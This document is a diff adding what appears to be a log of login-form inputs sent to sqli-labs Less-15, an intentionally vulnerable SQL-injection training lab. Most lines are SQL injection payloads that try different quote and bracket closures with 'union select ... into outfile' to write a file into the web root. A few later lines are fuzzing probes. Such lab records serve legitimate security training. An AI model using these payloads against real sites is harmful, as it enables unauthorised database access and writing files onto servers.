@@ -1,0 +1,37 @@
+User Name:\Password:
+User Name:\Password:
+User Name:' union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:" union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:") union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:') union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:')) union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:")) union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name: union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:') union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:')) union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:" union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:") union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:")) union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:' union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt' #Password:
+User Name:' union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt'  # Password:
+User Name:' union select 1,2  into '/var/www/html/sqli-labs/Less-15/u.txt'  #Password:
+User Name:' union select 1,2  into "/var/www/html/sqli-labs/Less-15/u.txt"  #Password:
+User Name:Password:
+User Name:Password:
+User Name:Password:
+User Name:\Password:
+User Name:' union select 3,2  into outfile '/var/www/html/sqli-labs/Less-15/u.txt'  #Password:
+User Name:JohnPassword:data
+User Name:Johnx77l00c7Password:data
+User Name:x77l00db'"<=/-*>x77l00dbPassword:data
+User Name:JohnPassword:datax77vd4pb
+User Name:JohnPassword:x77vd4pc'"<=/-*>x77vd4pc
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
+User Name:JohnPassword:data
